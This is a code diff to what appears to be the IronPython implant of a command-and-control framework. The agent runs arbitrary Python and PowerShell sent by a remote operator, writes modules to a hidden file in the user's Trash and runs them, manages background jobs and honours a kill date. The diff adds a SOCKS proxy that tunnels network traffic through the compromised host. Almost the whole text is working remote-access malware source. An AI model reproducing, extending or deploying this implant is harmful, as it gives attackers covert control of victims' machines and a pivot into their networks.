@@ -6,6 +6,7 @@ import json
 import math
 import numbers
 import os
+import queue as Queue
 import random
 import re
 import shutil
@@ -24,6 +25,7 @@ from os.path import expanduser
 from threading import Thread
 
 import clr
+import secretsocks
 import System
 from System import Environment
 
@@ -52,6 +54,8 @@ jobMessageBuffer = ''
 currentListenerName = ""
 sendMsgFuncCode = ""
 proxy_list = []
+_socksthread = None
+_socksqueue = None
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
@@ -65,7 +69,7 @@ headersRaw = parts[2:]
 
 defaultResponse = base64.b64decode("")
 
-jobs = []
+jobs = {}
 moduleRepo = {}
 _meta_cache = {}
 
@@ -176,8 +180,15 @@ def parse_task_packet(packet, offset=0):
         packetNum = struct.unpack('=H', packet[4 + offset:6 + offset])[0]
         resultID = struct.unpack('=H', packet[6 + offset:8 + offset])[0]
         length = struct.unpack('=L', packet[8 + offset:12 + offset])[0]
-        packetData = packet[12 + offset:12 + offset + length].decode('UTF-8')
-        remainingData = packet[12 + offset + length:].decode('UTF-8')
+        try:
+            packetData = packet[12 + offset:12 + offset + length].decode('UTF-8')
+        except:
+            packetData = packet[12 + offset:12 + offset + length].decode('latin-1')
+
+        try:
+            remainingData = packet[12 + offset + length:].decode('UTF-8')
+        except:
+            remainingData = packet[12 + offset + length:].decode('latin-1')
 
         return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
     except Exception as e:
@@ -254,6 +265,7 @@ def process_packet(packetType, data, resultID):
         agent_exit()
 
     elif packetType == 34:
+        # TASK_SET_PROXY
         proxy_list = json.loads(data)
         update_proxychain(proxy_list)
 
@@ -357,157 +369,9 @@ def process_packet(packetType, data, resultID):
 
         send_message(build_response_packet(43, result_data, resultID))
 
-    elif packetType == 50:
-        # return the currently running jobs
-        msg = ""
-        if len(jobs) == 0:
-            msg = "No active jobs"
-        else:
-            msg = "Active jobs:\n"
-            for x in range(len(jobs)):
-                msg += "\t%s" % (x)
-        send_message(build_response_packet(50, msg, resultID))
-
-    elif packetType == 51:
-        # stop and remove a specified job if it's running
-        try:
-            # Calling join first seems to hang
-            # result = jobs[int(data)].join()
-            send_message(build_response_packet(0, "[*] Attempting to stop job thread", resultID))
-            result = jobs[int(data)].kill()
-            send_message(build_response_packet(0, "[*] Job thread stoped!", resultID))
-            jobs[int(data)]._Thread__stop()
-            jobs.pop(int(data))
-            if result and result != "":
-                send_message(build_response_packet(51, result, resultID))
-        except:
-            return build_response_packet(0, "error stopping job: %s" % (data), resultID)
-
-    elif packetType == 100:
-        # dynamic code execution, wait for output, don't save outputPicl
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(data, '<string>', 'exec')
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            results = buffer.getvalue()
-            send_message(build_response_packet(100, str(results), resultID))
-        except Exception as e:
-            errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" % (
-            e, errorData), resultID)
-
-    elif packetType == 101:
-        # dynamic code execution, wait for output, save output
-        prefix = data[0:15].strip()
-        extension = data[15:20].strip()
-        data = data[20:]
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(data, '<string>', 'exec')
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            results = buffer.getvalue().encode('latin-1')
-            c = compress()
-            start_crc32 = c.crc32_data(results)
-            comp_data = c.comp_data(results)
-            encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
-            send_message(
-                build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart,
-                                      resultID))
-        except Exception as e:
-            # Also return partial code that has been executed
-            errorData = buffer.getvalue()
-            send_message(build_response_packet(0,
-                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
-                                               e, errorData), resultID))
-
-    elif packetType == 102:
-        # on disk code execution for modules that require multiprocessing not supported by exec
-        try:
-            implantHome = expanduser("~") + '/.Trash/'
-            moduleName = ".mac-debug-data"
-            implantPath = implantHome + moduleName
-            result = "[*] Module disk path: %s \n" % (implantPath)
-            with open(implantPath, 'w') as f:
-                f.write(data)
-            result += "[*] Module properly dropped to disk \n"
-            pythonCommand = "python %s" % (implantPath)
-            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
-            data = process.communicate()
-            result += data[0].strip()
-            try:
-                os.remove(implantPath)
-                result += "[*] Module path was properly removed: %s" % (implantPath)
-            except Exception as e:
-                print("error removing module filed: %s" % (e))
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                result += "\n\nError removing module file, please verify path: " + str(implantPath)
-            send_message(build_response_packet(100, str(result), resultID))
-        except Exception as e:
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                send_message(build_response_packet(0,
-                                                   "error executing specified Python data: %s \nError removing module file, please verify path: %s" % (
-                                                   e, implantPath), resultID))
-            send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))
-
-    elif packetType == 110:
-        start_job(data, resultID)
-
-    elif packetType == 111:
-        # TASK_CMD_JOB_SAVE
-        pass
-
-    elif packetType == 112:
-        data = data.lstrip("\x00")
-
-        # powershell task
-        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
-        myrunspace.Open()
-        pipeline = myrunspace.CreatePipeline()
-        pipeline.Commands.AddScript(data)
-        results = pipeline.Invoke()
-        buffer = StringIO()
-        sys.stdout = buffer
-        for result in results:
-            print(result)
-        sys.stdout = sys.__stdout__
-        result_packet = build_response_packet(110, str(buffer.getvalue()), resultID)
-        process_job_tasking(result_packet)
-
-    elif packetType == 118:
-        # dynamic code execution, wait for output, don't save output
-        try:
-            data = data.lstrip("\x00")
-
-            # powershell task
-            myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
-            myrunspace.Open()
-            pipeline = myrunspace.CreatePipeline()
-            pipeline.Commands.AddScript(data)
-            pipeline.Commands.Add('Out-String')
-            results = pipeline.Invoke()
-
-            for result in results:
-                print(result)
-
-            result_packet = build_response_packet(110, str(result), resultID)
-            process_job_tasking(result_packet)
-
-        except Exception as e:
-            print(e)
-            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))
-
-    elif packetType == 119:
-        pass
-
     elif packetType == 44:
         # run csharp module in ironpython using reflection
+        # todo: make this a job a thread to be trackable
         try:
             import zlib
 
@@ -570,6 +434,169 @@ def process_packet(packetType, data, resultID):
 
         except Exception as e:
             send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))
+
+    elif packetType == 50:
+        # return the currently running jobs
+        msg = "Active jobs:\n"
+
+        for key in jobs:
+            msg += "Task %s" % key
+        send_message(build_response_packet(50, msg, resultID))
+
+    elif packetType == 51:
+        # stop and remove a specified job if it's running
+        try:
+            jobs[int(data)].kill()
+            jobs.pop(int(data))
+            send_message(build_response_packet(51, "[+] Job thread %s stopped successfully" % (data), resultID))
+        except Exception as e:
+            send_message(build_response_packet(51, "[!] Error stopping job thread: %s" % (e), resultID))
+
+    elif packetType == 60:
+        global _socksthread
+        global _socksqueue
+
+        # Create a server object in its own thread
+        if not _socksthread:
+            try:
+                jobs[resultID] = Queue.Queue()
+                jobs[resultID] = KThread(target=Server, args=(_socksqueue, resultID,))
+                jobs[resultID].daemon = True
+                jobs[resultID].start()
+                _socksthread = True
+                send_message(build_response_packet(60, "[+] SOCKS server successfully started", resultID))
+            except:
+                _socksthread = False
+                send_message(build_response_packet(60, "[!] SOCKS server failed to start", resultID))
+        else:
+            send_message(build_response_packet(60, "[!] SOCKS server already running", resultID))
+
+    elif packetType == 61:
+        _socksqueue.put(base64.b64decode(data.encode('UTF-8')))
+
+    elif packetType == 100:
+        # dynamic code execution, wait for output, don't save output
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(data, '<string>', 'exec')
+            exec(code_obj, globals())
+            sys.stdout = sys.__stdout__
+            results = buffer.getvalue()
+            send_message(build_response_packet(100, str(results), resultID))
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" % (
+            e, errorData), resultID)
+
+    elif packetType == 101:
+        # dynamic code execution, wait for output, save output
+        prefix = data[0:15].strip()
+        extension = data[15:20].strip()
+        data = data[20:]
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(data, '<string>', 'exec')
+            exec(code_obj, globals())
+            sys.stdout = sys.__stdout__
+            results = buffer.getvalue().encode('latin-1')
+            c = compress()
+            start_crc32 = c.crc32_data(results)
+            comp_data = c.comp_data(results)
+            encodedPart = c.build_header(comp_data, start_crc32)
+            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
+            send_message(
+                build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart,
+                                      resultID))
+        except Exception as e:
+            # Also return partial code that has been executed
+            errorData = buffer.getvalue()
+            send_message(build_response_packet(0,
+                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
+                                               e, errorData), resultID))
+
+    elif packetType == 102:
+        # on disk code execution for modules that require multiprocessing not supported by exec
+        # todo: is this used?
+        try:
+            implantHome = expanduser("~") + '/.Trash/'
+            moduleName = ".mac-debug-data"
+            implantPath = implantHome + moduleName
+            result = "[*] Module disk path: %s \n" % (implantPath)
+            with open(implantPath, 'w') as f:
+                f.write(data)
+            result += "[*] Module properly dropped to disk \n"
+            pythonCommand = "python %s" % (implantPath)
+            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
+            data = process.communicate()
+            result += data[0].strip()
+            try:
+                os.remove(implantPath)
+                result += "[*] Module path was properly removed: %s" % (implantPath)
+            except Exception as e:
+                print("error removing module filed: %s" % (e))
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                result += "\n\nError removing module file, please verify path: " + str(implantPath)
+            send_message(build_response_packet(100, str(result), resultID))
+        except Exception as e:
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                send_message(build_response_packet(0,
+                                                   "error executing specified Python data: %s \nError removing module file, please verify path: %s" % (
+                                                   e, implantPath), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))
+
+    elif packetType == 110:
+        start_job(data, resultID)
+
+    elif packetType == 111:
+        # TASK_CMD_JOB_SAVE
+        pass
+
+    elif packetType == 112:
+        data = data.lstrip("\x00")
+        # todo: make this a job a thread to be trackable
+        # powershell task
+        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
+        myrunspace.Open()
+        pipeline = myrunspace.CreatePipeline()
+        pipeline.Commands.AddScript(data)
+        results = pipeline.Invoke()
+        buffer = StringIO()
+        sys.stdout = buffer
+        for result in results:
+            print(result)
+        sys.stdout = sys.__stdout__
+        result_packet = build_response_packet(110, str(buffer.getvalue()), resultID)
+        process_job_tasking(result_packet)
+
+    elif packetType == 118:
+        # PowerShel Task - dynamic code execution, wait for output, don't save output
+        try:
+            data = data.lstrip("\x00")
+
+            # powershell task
+            myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
+            myrunspace.Open()
+            pipeline = myrunspace.CreatePipeline()
+            pipeline.Commands.AddScript(data)
+            pipeline.Commands.Add('Out-String')
+            results = pipeline.Invoke()
+
+            for result in results:
+                print(result)
+
+            result_packet = build_response_packet(110, str(result), resultID)
+            process_job_tasking(result_packet)
+
+        except Exception as e:
+            print(e)
+            send_message(build_response_packet(0, "error executing specified Python data %s " % (e), resultID))
+
+    elif packetType == 119:
+        pass
 
     elif packetType == 121:
         # base64 decode the script and execute
@@ -640,8 +667,16 @@ def process_packet(packetType, data, resultID):
         except Exception as e:
             send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
 
+    elif packetType == 130:
+        # Dynamically update agent comms
+        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+
+    elif packetType == 131:
+        # Update the listener name variable
+        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+
     else:
-        send_message(build_response_packet(0, "invalid tasking ID: %s" % (taskingID), resultID))
+        send_message(build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID))
 
 
 def old_div(a, b):
@@ -754,6 +789,39 @@ class CFinder(object):
             finder = _meta_cache.pop(repoName)
             sys.meta_path.remove(finder)
 
+################################################
+#
+# Socks Server
+#
+################################################
+class Server(secretsocks.Server):
+    # Initialize our data channel
+    def __init__(self, q, resultID):
+        secretsocks.Server.__init__(self)
+        self.queue = q
+        self.resultID = resultID
+        self.alive = True
+        self.start()
+
+    # Receive data from our data channel and push it to the receive queue
+    def recv(self):
+        while self.alive:
+            try:
+                data = self.queue.get()
+                self.recvbuf.put(data)
+            except socket.timeout:
+                continue
+            except:
+                self.alive = False
+
+    # Take data from the write queue and send it over our data channel
+    def write(self):
+        while self.alive:
+            try:
+                data = self.writebuf.get(timeout=3)
+                send_message(build_response_packet(61, base64.b64encode(data).decode('UTF-8'), self.resultID))
+            except Queue.Empty:
+                continue
 
 ################################################
 #
@@ -851,7 +919,7 @@ def agent_exit():
     if len(jobs) > 0:
         try:
             for x in jobs:
-                jobs[int(x)].kill()
+                jobs[x].kill()
                 jobs.pop(x)
         except:
             # die hard if thread kill fails
@@ -892,7 +960,7 @@ class KThread(threading.Thread):
     def start(self):
         """Start the thread."""
         self.__run_backup = self.run
-        self.run = self.__run  # Force the Thread toinstall our trace.
+        self.run = self.__run  # Force the Thread to install our trace.
         threading.Thread.start(self)
 
     def __run(self):
@@ -935,7 +1003,7 @@ def start_job(code, resultID):
     codeThread = KThread(target=job_func, args=(resultID,))
     codeThread.start()
 
-    jobs.append(codeThread)
+    jobs[resultID] = codeThread
 
 
 def job_func(resultID):
@@ -953,6 +1021,7 @@ def job_func(resultID):
         p = "error executing specified Python job data: " + str(e)
         result = build_response_packet(0, p, resultID)
         process_job_tasking(result)
+
 
 def job_message_buffer(message):
     # Supports job messages for checkin
